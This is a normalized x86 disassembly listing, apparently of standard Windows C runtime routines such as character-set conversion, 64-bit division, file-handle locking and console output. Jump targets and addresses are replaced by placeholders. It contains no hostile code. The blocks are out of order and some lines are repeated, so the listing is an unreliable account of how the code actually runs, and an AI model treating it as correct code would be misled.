xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_432c17
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_427b11
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_434f10
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_434fa5
push 0x8
push r--data
call sub_429ad0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_429b15
retn
push 0xa
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_435028
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_435031
push 0x18
push r--data
call sub_429ad0
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
and [ ebp - 0x24 ] 0x0
push 0xb
call sub_425bde
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
or eax esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4351cd
mov eax esi
mov edi [ ebx * 4 + rw-data ]
test edi edi
je r-xdata
call sub_429b15
retn
push 0x40
push 0x20
call sub_4266a7
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp edi eax
jae r-xdata
mov [ ebx * 4 + rw-data ] ecx
add [ rw-data ] 0x20
cmp esi 0xffffffff
jne r-xdata
test [ edi + 0x4 ] 0x1
jne r-xdata
mov esi ebx
shl esi 0x5
mov [ ebp - 0x1c ] esi
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push esi
call sub_434fa5
pop ecx
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
and [ ecx + 0x8 ] 0x0
add ecx 0x40
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc ebx
jmp r-xdata
add edi 0x40
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x28 ] ebx
cmp ebx 0x40
jge r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
push 0xa
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
test [ edi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_435105
push 0xfa0
lea eax [ edi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ edi + 0x8 ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x1
or [ edi ] 0xffffffff
mov esi edi
sub esi [ ebx * 4 + rw-data ]
sar esi 0x6
mov eax ebx
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_4351d6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_43525c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_4352c3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
test ecx ecx
js r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov ebx ecx
sar ebx 0x5
mov edi ecx
mov eax [ ebx * 4 + rw-data ]
and edi 0x1f
shl edi 0x6
cmp [ edi + eax ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push esi
mov esi [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov [ edi + eax ] esi
xor eax eax
pop esi
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
push 0xfffffff6
dec ecx
je r-xdata
push esi
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push esi
push 0xfffffff4
jmp r-xdata
sub_435345
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_43536b
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_438807
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_4353ac
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_4353fe
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_43559d
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
mov [ ebp + 0xc ] esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_427b11
mov [ eax ] 0x2a
call sub_427b11
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_427b11
push 0x22
pop esi
mov [ eax ] esi
call sub_42a231
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_427900
add esp 0xc
push edi
push esi
push ebx
call sub_427900
add esp 0xc
sub_4356e3
push 0x14
push r--data
call sub_429ad0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_429b15
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_4357aa
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43577e
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43577e
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_435345
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_4357aa
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_423412
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433466
push [ ebp - 0x4 ]
mov esi eax
call sub_422732
add esp 0x20
mov eax esi
pop esi
leave
retn
or eax 0xffffffff
leave
retn
sub_43582c
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4247f2
mov eax [ ebp - 0x10 ]
xor edx edx
cmp [ eax + 0x8 ] edx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438830
add esp 0xc
mov edx eax
jmp r-xdata
pop esi
leave
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov edx 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
pop edi
pop ebx
je r-xdata
movzx ecx [ ebx ]
mov edx [ ebp - 0x10 ]
dec esi
mov eax ecx
inc ebx
test [ eax + edx + 0x19 ] 0x4
push 0x0
mov [ ebp - 0x4 ] ebx
pop edx
je r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
movzx ebx [ edi ]
mov edx [ ebp - 0x10 ]
mov eax ebx
inc edi
test [ eax + edx + 0x19 ] 0x4
push 0x0
pop edx
je r-xdata
test esi esi
jne r-xdata
cmp bx cx
jne r-xdata
test esi esi
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ edi ]
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ eax + ebx + 0x19 ] 0x4
jne r-xdata
sbb edx edx
and edx 0x2
dec edx
test cx cx
je r-xdata
mov al [ edi ]
dec esi
test al al
je r-xdata
mov ebx edx
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
inc ebx
movzx ecx cx
mov [ ebp - 0x4 ] ebx
mov ecx edx
jmp r-xdata
mov al [ edi ]
movzx ebx al
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test esi esi
jne r-xdata
shl ebx 0x8
movzx eax al
or bx ax
movzx ebx bx
inc edi
jmp r-xdata
sub_435959
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_4247f2
mov edi [ ebp + 0x10 ]
xor edx edx
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4388a8
add esp 0xc
mov edx eax
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov edx 0x7fffffff
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
movzx eax al
dec edi
inc esi
test [ eax + ecx + 0x19 ] 0x4
mov [ ebp - 0x8 ] esi
je r-xdata
mov si [ ebp - 0x4 ]
movzx eax si
test [ eax + ecx + 0x19 ] 0x10
je r-xdata
test edi edi
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
movzx eax al
inc ebx
test [ eax + ecx + 0x19 ] 0x4
je r-xdata
movzx eax [ eax + ecx + 0x119 ]
mov [ ebp - 0x4 ] eax
mov al [ esi ]
test al al
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] edx
test [ eax + ecx + 0x19 ] 0x4
jne r-xdata
mov ax [ ebp + 0x10 ]
movzx edx ax
push 0x0
test [ edx + ecx + 0x19 ] 0x10
mov [ ebp + 0x10 ] edx
pop edx
je r-xdata
test edi edi
jne r-xdata
shl [ ebp + 0x10 ] 0x8
movzx eax al
or [ ebp + 0x10 ] ax
mov eax [ ebp + 0x10 ]
movzx eax ax
inc esi
mov [ ebp - 0x8 ] esi
mov si ax
mov [ ebp - 0x4 ] eax
cmp si [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov al [ ebx ]
movzx eax al
mov si dx
jmp r-xdata
cmp ax si
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax + ecx + 0x119 ]
mov al [ ebx ]
dec edi
test al al
je r-xdata
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp si [ ecx + 0x12 ]
jb r-xdata
cmp si [ ecx + 0xe ]
ja r-xdata
mov si [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
sbb edx edx
and edx 0x2
dec edx
test si si
je r-xdata
shl [ ebp - 0x4 ] 0x8
movzx eax al
or [ ebp - 0x4 ] ax
mov eax [ ebp - 0x4 ]
movzx eax ax
inc ebx
mov [ ebp + 0x10 ] eax
cmp ax [ ecx + 0xc ]
jb r-xdata
mov ax [ ebp + 0x10 ]
cmp si [ ecx + 0x14 ]
ja r-xdata
add si [ ecx + 0x10 ]
jmp r-xdata
mov esi [ ebp - 0x8 ]
test edi edi
jne r-xdata
cmp ax [ ecx + 0x12 ]
jb r-xdata
cmp ax [ ecx + 0xe ]
ja r-xdata
add si [ ecx + 0x16 ]
jmp r-xdata
jmp r-xdata
cmp ax [ ecx + 0x14 ]
ja r-xdata
add ax [ ecx + 0x10 ]
jmp r-xdata
add ax [ ecx + 0x16 ]
jmp r-xdata
sub_435b15
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
push eax
call sub_422732
pop ecx
sub_435c11
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ecx
cmp [ ebx + 0xac ] ecx
jne r-xdata
push 0x50
push 0x1
call sub_4266a7
mov esi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
cmp [ ebx + 0xb0 ] ecx
jne r-xdata
push 0x4
call sub_4266f1
mov edi eax
pop ecx
mov [ ebp - 0x4 ] edi
test edi edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edi ecx
mov [ ebp - 0x4 ] ecx
mov esi rw-data
jmp r-xdata
and [ edi ] 0x0
cmp [ ebx + 0xac ] 0x0
je r-xdata
push esi
call sub_422732
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x14
pop ecx
mov esi rw-data
[ edi ] [ esi ]
push 0x4
call sub_4266f1
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov [ edi ] ecx
and [ eax ] 0x0
mov edi [ ebx + 0xac ]
lea eax [ esi + 0xc ]
push eax
push 0x15
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
push 0x14
push edi
mov esi eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
push 0x16
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x18
push eax
push 0x17
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x1c
push eax
push 0x18
push edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
push 0x50
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x24
push eax
push 0x51
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x28
push eax
push 0x1a
push edi
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x29
push eax
push 0x19
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2a
push eax
push 0x54
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2b
push eax
push 0x55
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2c
push eax
push 0x56
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x2d
push eax
push 0x57
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2e
push eax
push 0x52
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2f
push eax
push 0x53
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x38
push eax
push 0x15
push edi
push 0x2
lea eax [ ebp - 0x14 ]
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x3c
push eax
push 0x14
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
push 0x16
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x44
push eax
push 0x17
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x48
push eax
push 0x50
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x4c
push eax
push 0x51
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
add esp 0x14
or eax esi
je r-xdata
push esi
call sub_422732
push edi
call sub_422732
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x78 ] eax
mov [ ebx + 0x80 ] edi
mov [ ebx + 0x84 ] esi
xor eax eax
push [ ebx + 0x78 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov edx [ edx ]
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_435b15
push ebx
call sub_422732
mov eax [ ebp - 0x4 ]
push eax
call sub_422732
mov eax [ ebp - 0x8 ]
push eax
call sub_422732
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ ebx + 0x84 ]
call sub_422732
push [ ebx + 0x78 ]
call sub_422732
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
